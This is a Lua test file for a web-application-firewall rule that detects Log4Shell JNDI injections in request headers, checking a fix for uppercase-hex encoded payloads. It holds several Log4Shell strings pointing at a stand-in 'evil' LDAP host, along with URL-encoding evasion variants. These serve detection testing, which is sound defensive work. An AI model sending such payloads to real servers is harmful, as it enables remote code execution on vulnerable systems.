-- Tests for the Log4Shell header precheck hex-case fix (audit F35, rule 328
-- WAF_CVE:LOG4SHELL, production tier: logonly).
--
-- detect_log4shell's per-header gate was:
--     raw:find("${") or raw:find("%24%7b")
-- The encoded needle was lowercase-hex only. Standard URL-encoding emits
-- UPPERCASE %24%7B (what curl produces), so a header carrying
-- "%24%7Bjndi:ldap://evil/a%7D" matched neither needle, was skipped, and the
-- decode+match branch never ran. Fix: also precheck the uppercase form
-- (url_decode_once already handles either hex case, so only the gate was wrong).
--
-- Tested at "block" for a crisp hit=true assertion (rule-319/606 convention);
-- production tier is unchanged (logonly).

_G.ngx = {
  now           = function() return 1000 end,
  decode_base64 = function(_) return nil end,
  log           = function(_, _) end,
  ERR           = 0, WARN = 1, INFO = 2,
}

package.path = "configs/lua/?.lua;" .. package.path
local waf = require("cfm_waf")

local fails = 0
local function check(cond, msg)
  if cond then return end
  fails = fails + 1
  io.stderr:write("FAIL: " .. msg .. "\n")
end

local function set_only(map)
  local snap = waf.get_config()
  for k, _ in pairs(snap) do
    if k:sub(1, 5) == "rule_" then waf.set_rule(k, "disabled") end
  end
  for k, m in pairs(map) do waf.set_rule(k, m) end
end

-- Payload delivered in a request header (Log4Shell's classic vector).
local function ua(value)
  return { uri = "/", args = "", method = "GET", ip = "203.0.113.80",
           headers = { ["User-Agent"] = value }, body = "" }
end

local PFX = "WAF_CVE:LOG4SHELL:JNDI:HDR:"
local function fires_jndi_hdr(ctx, label)
  local hit, reason = waf.check(ctx)
  check(hit == true, label .. " — hit=true (got " .. tostring(hit) .. ")")
  check(type(reason) == "string" and reason:sub(1, #PFX) == PFX,
        label .. " — reason starts with " .. PFX .. " (got " .. tostring(reason) .. ")")
end
local function clean(ctx, label)
  local hit = waf.check(ctx)
  check(hit ~= true, label .. " — must NOT fire (got hit=" .. tostring(hit) .. ")")
end

set_only({ rule_log4shell = "block" })

-- ── F35: UPPERCASE-hex encoded ${jndi in a header (was skipped pre-fix) ──────
fires_jndi_hdr(ua("%24%7Bjndi:ldap://evil/a%7D"),        "uppercase %24%7B jndi (curl default)")
fires_jndi_hdr(ua("x %24%7BjNdI:ldap://evil/a%7D y"),    "uppercase %24%7B jndi, mixed inner case + surrounding text")

-- ── F35 (completeness): PARTIAL single-encodings that one-pass-decode to ${jndi
-- Same realism as the fully-encoded target — one downstream decode reveals the
-- lookup. The gate now admits all six adjacency forms so it stays consistent
-- with the decode+match below.
fires_jndi_hdr(ua("%24{jndi:ldap://evil/a}"),            "$ encoded, { literal (%24{jndi)")
fires_jndi_hdr(ua("$%7Bjndi:ldap://evil/a%7D"),          "$ literal, { encoded UPPER ($%7Bjndi)")
fires_jndi_hdr(ua("$%7bjndi:ldap://evil/a%7d"),          "$ literal, { encoded lower ($%7bjndi)")

-- ── Regressions: lowercase-hex and literal forms still fire ──────────────────
fires_jndi_hdr(ua("%24%7bjndi:ldap://evil/a%7d"),        "lowercase %24%7b jndi (regression)")
fires_jndi_hdr(ua("${jndi:ldap://evil/a}"),              "literal ${jndi (regression)")

-- ── FP-negatives ─────────────────────────────────────────────────────────────
clean(ua("Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"),  "normal User-Agent")
-- Precheck passes on %24%7B but the decoded value is not a JNDI lookup form:
-- the decode+match must still return nil (gate passing != a hit).
clean(ua("%24%7Bfoo%7D"),                                    "encoded ${foo} — no jndi/evasion form")
clean(ua("price is %2450 and 7B is hex"),                    "stray %24 / 7B, no encoded brace pair")
-- Loose needles gate-pass but decode to a non-lookup → still no hit (proves the
-- broadened gate is FP-neutral; the match is the sole hit-decider).
clean(ua("field %24%7Cpipe=1"),                              "%24%7C gate-passes (%24%7) but decodes to $|pipe")
clean(ua("cost $%70 each"),                                  "$%70 gate-passes ($%7) but decodes to $p")

if fails > 0 then
  io.stderr:write(("cfm_waf Log4Shell hex-case tests: %d FAILED\n"):format(fails))
  os.exit(1)
end
print("ok: cfm_waf Log4Shell header precheck accepts uppercase %24%7B (F35, rule 328)")
